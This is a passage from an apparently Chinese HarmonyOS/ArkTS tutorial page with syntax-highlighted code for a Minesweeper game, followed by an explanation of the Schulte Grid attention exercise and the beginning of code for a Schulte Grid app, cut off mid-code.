生成游戏面板</span></span><br><span class="line">  private <span class="title function_">generateBoard</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameBoard</span> = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameBoard</span>.<span class="title function_">push</span>([]);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i].<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(i, j));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">placeMines</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">calculateNumbers</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 随机放置地雷</span></span><br><span class="line">  private <span class="title function_">placeMines</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> placed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (placed &lt; <span class="variable language_">this</span>.<span class="property">mineCount</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> x = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">let</span> y = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">gameBoard</span>[x][y].<span class="property">hasMine</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">gameBoard</span>[x][y].<span class="property">hasMine</span> = <span class="literal">true</span>;</span><br><span class="line">        placed++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 计算每个方块周围的地雷数量</span></span><br><span class="line">  private <span class="title function_">calculateNumbers</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">hasMine</span>) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">neighborMines</span> = <span class="variable language_">this</span>.<span class="title function_">countNeighborMines</span>(i, j);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">neighborMines</span>.<span class="title function_">toString</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">value</span> = <span class="string">&#x27;雷&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 计算给定坐标周围地雷的数量</span></span><br><span class="line">  private <span class="title function_">countNeighborMines</span>(<span class="attr">row</span>: number, <span class="attr">col</span>: number): number &#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> dx = -<span class="number">1</span>; dx &lt;= <span class="number">1</span>; dx++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> dy = -<span class="number">1</span>; dy &lt;= <span class="number">1</span>; dy++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dx === <span class="number">0</span> &amp;&amp; dy === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> newRow = row + dx, newCol = col + dy;</span><br><span class="line">        <span class="keyword">if</span> (newRow &gt;= <span class="number">0</span> &amp;&amp; newRow &lt; <span class="number">10</span> &amp;&amp; newCol &gt;= <span class="number">0</span> &amp;&amp; newCol &lt; <span class="number">10</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">gameBoard</span>[newRow][newCol].<span class="property">hasMine</span>) &#123;</span><br><span class="line">          count++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 揭示方块</span></span><br><span class="line">  private <span class="title function_">revealCell</span>(<span class="params">row: number, col: number</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isGameOver</span> || <span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;row&#125;</span>,<span class="subst">$&#123;col&#125;</span>`</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> key = <span class="string">`<span class="subst">$&#123;row&#125;</span>,<span class="subst">$&#123;col&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">add</span>(key);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">gameBoard</span>[row][col].<span class="property">hasMine</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showGameOverDialog</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">gameBoard</span>[row][col].<span class="property">neighborMines</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> dx = -<span class="number">1</span>; dx &lt;= <span class="number">1</span>; dx++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> dy = -<span class="number">1</span>; dy &lt;= <span class="number">1</span>; dy++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dx === <span class="number">0</span> &amp;&amp; dy === <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> newRow = row + dx, newCol = col + dy;</span><br><span class="line">            <span class="keyword">if</span> (newRow &gt;= <span class="number">0</span> &amp;&amp; newRow &lt; <span class="number">10</span> &amp;&amp; newCol &gt;= <span class="number">0</span> &amp;&amp; newCol &lt; <span class="number">10</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">revealCell</span>(newRow, newCol);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isVictory</span>()) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showVictoryDialog</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 显示游戏结束对话框</span></span><br><span class="line">  private <span class="title function_">showGameOverDialog</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>;</span><br><span class="line">    promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;游戏结束: 游戏失败！&#x27;</span>,</span><br><span class="line">      <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;重新开始&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;]</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 显示胜利对话框</span></span><br><span class="line">  private <span class="title function_">showVictoryDialog</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>;</span><br><span class="line">    promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;恭喜你，游戏胜利！&#x27;</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">`用时：<span class="subst">$&#123;((<span class="built_in">Date</span>.now() - <span class="variable language_">this</span>.startTime) / <span class="number">1000</span>).toFixed(<span class="number">3</span>)&#125;</span>秒`</span>,</span><br><span class="line">      <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;重新开始&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;]</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 判断游戏是否胜利</span></span><br><span class="line">  private <span class="title function_">isVictory</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> revealedNonMineCount = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">gameBoard</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i].<span class="property">length</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;i&#125;</span>,<span class="subst">$&#123;j&#125;</span>`</span>)) &#123;</span><br><span class="line">          revealedNonMineCount++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> revealedNonMineCount == <span class="number">90</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 决定是否显示方块值</span></span><br><span class="line">  private <span class="title function_">isShowValue</span>(<span class="attr">cell</span>: <span class="title class_">Cell</span>): string &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isGameOver</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> cell.<span class="property">value</span> === <span class="string">&#x27;0&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : cell.<span class="property">value</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;cell.row&#125;</span>,<span class="subst">$&#123;cell.column&#125;</span>`</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> cell.<span class="property">value</span> === <span class="string">&#x27;0&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : cell.<span class="property">value</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">10</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">// 重置游戏按钮</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;重新开始&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>());</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 创建游戏面板容器</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">        <span class="comment">// 遍历每一行</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">gameBoard</span>, <span class="function">(<span class="params">row: Cell[], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// 遍历每一列</span></span><br><span class="line">          <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">cell: Cell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Stack</span>() &#123;</span><br><span class="line">              <span class="comment">// 显示方块上的数字或雷</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="title function_">isShowValue</span>(cell))</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;rowIndex&#125;</span>,<span class="subst">$&#123;colIndex&#125;</span>`</span>) ?</span><br><span class="line">                  (<span class="variable language_">this</span>.<span class="title function_">isShowValue</span>(cell) === <span class="string">&#x27;雷&#x27;</span> ? <span class="title class_">Color</span>.<span class="property">Red</span> : <span class="title class_">Color</span>.<span class="property">White</span>) : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(!<span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;rowIndex&#125;</span>,<span class="subst">$&#123;colIndex&#125;</span>`</span>) || <span class="variable language_">this</span>.<span class="title function_">isShowValue</span>(cell) === <span class="string">&#x27;雷&#x27;</span> ?</span><br><span class="line">                <span class="title class_">Color</span>.<span class="property">White</span> : <span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">                .<span class="title function_">parallelGesture</span>(<span class="title class_">GestureGroup</span>(<span class="title class_">GestureMode</span>.<span class="property">Exclusive</span>,</span><br><span class="line">                  <span class="title class_">TapGesture</span>(&#123; <span class="attr">count</span>: <span class="number">1</span>, <span class="attr">fingers</span>: <span class="number">1</span> &#125;)</span><br><span class="line">                    .<span class="title function_">onAction</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">revealCell</span>(rowIndex, colIndex)),</span><br><span class="line">                  <span class="title class_">LongPressGesture</span>(&#123; <span class="attr">repeat</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">                    .<span class="title function_">onAction</span>(<span class="function">() =&gt;</span> cell.<span class="property">isFlag</span> = <span class="literal">true</span>)</span><br><span class="line">                ));</span><br><span class="line"> </span><br><span class="line">              <span class="comment">// 显示标记旗帜</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;!<span class="variable language_">this</span>.revealedCells.has(<span class="string">`<span class="subst">$&#123;rowIndex&#125;</span>,<span class="subst">$&#123;colIndex&#125;</span>`</span>) ? <span class="string">&#x27;旗&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>)</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                .<span class="title function_">visibility</span>(cell.<span class="property">isFlag</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">isGameOver</span> ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                  cell.<span class="property">isFlag</span> = <span class="literal">false</span>;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellMargin * <span class="number">2</span>) * <span class="number">10</span>&#125;</span>lpx`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 方块类</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  <span class="comment">// 方块所在的行</span></span><br><span class="line">  <span class="attr">row</span>: number;</span><br><span class="line">  <span class="comment">// 方块所在的列</span></span><br><span class="line">  <span class="attr">column</span>: number;</span><br><span class="line">  <span class="comment">// 是否有地雷</span></span><br><span class="line">  <span class="attr">hasMine</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// 周围地雷数量</span></span><br><span class="line">  <span class="attr">neighborMines</span>: number = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 是否被标记为地雷</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isFlag</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// 方块值</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">value</span>: string;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">row: number, column: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">row</span> = row;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">column</span> = column;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Schrulte-Grid"><a href="#Schrulte-Grid" class="headerlink" title="Schrulte Grid"></a>Schrulte Grid</h1><p>舒尔特方格（Schrulte Grid），也被称为舒尔特表或舒尔特图表，是一种用于训练注意力、视觉搜索速度和广度的简单而有效的工具。它通常由一个5x5的方格组成，每个小格子里随机填写了1到25的数字。训练者需要尽快地按照数字顺序找出这些数字，并用手指指出或说出它们的位置。</p><p>这种练习可以帮助提高眼睛的移动速度、扩大视野范围、增强大脑的反应速度和专注力，因此常被用来作为儿童和成人的注意力训练方法之一。此外，它也被一些专业领域（如飞行员、运动员等）用来提升快速信息处理能力和决策效率。</p><p>进行舒尔特方格训练时，建议：</p><p>保持正确的姿势，确保光线充足。<br>眼睛与纸面保持适当距离，一般为30-40厘米。<br>尽量不要用手指直接指着数字，以锻炼眼睛的移动能力。<br>随着熟练程度的提高，可以尝试更复杂或更大的方格，比如6x6或7x7。<br>定期练习，但也要注意休息，避免过度疲劳。<br>舒尔特方格不仅是一个简单的游戏，也是一个实用的认知训练工具，对于改善注意力集中度和个人效率有着积极的作用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Index</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">numbers</span>: number[] = [];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentIndex</span>: number = <span class="number">0</span>; <span class="comment">//用于判断用户点击是否正确</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">timeStart</span>: number = <span class="number">0</span>;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">widthItem</span>: number = <span class="number">120</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">marginItem</span>: number = <span class="number">5</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 初始化舒尔特方格</span></span><br><span class="line">  <span class="title function_">initGrid</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">numbers</span> = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">numbers</span>.<span class="title function_">push</span>(i + <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">shuffleArray</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">numbers</span>)));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentIndex</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">timeStart</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>()</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 随机打乱数组</span></span><br><span class="line">  <span class="title function_">shuffleArray</span>(<span class="params">array: number[]</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = array.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">      <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">25</span>);</span><br><span class="line">      <span class="keyword">let</span> temp = array[i]</span><br><span class="line">      array[i] = array[j]</span><br><span class="line">      array[j] = temp</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">numbers</span> = array</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 判断是否完成</span></span><br><span class="line">  <span class="title function_">isCompleted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">currentIndex</span> === <span class="number">25</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">numbers</span>, <span class="function">(<span class="params">item: number, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.widthItem&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.widthItem&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.marginItem&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.widthItem/<span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">            .<span class="title function_">visibility</span>(item &lt;= <span class="variable language_">this</span>.<span class="property">currentIndex</span> ? <span class="title class_">Visibility</span>.<span class="property">Hidden</span> : <span class="title class_">Visibility</span>.<span class="property">Visible</span>)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">numbers</span>[index] === <span class="variable language_">this</span>.<span class="property">currentIndex</span> + <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">currentIndex</span>++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isCompleted</span>()) &#123;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;完成！&#x27;</span>);</span><br><span class="line">                  promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">`用时`</span>,</span><br><span class="line">                    <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;((<span class="built_in">Date</span>.now() - <span class="variable language_">this</span>.timeStart) / <span class="number">1000</span>).toFixed(<span class="number">3</span>)&#125;</span>秒`</span>,</span><br><span class="line">                    <span class="attr">buttons</span>: [</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="attr">text</span>: <span class="string">&#x27;重新开始&#x27;</span>,</span><br><span class="line">                        <span class="attr">color</span>: <span 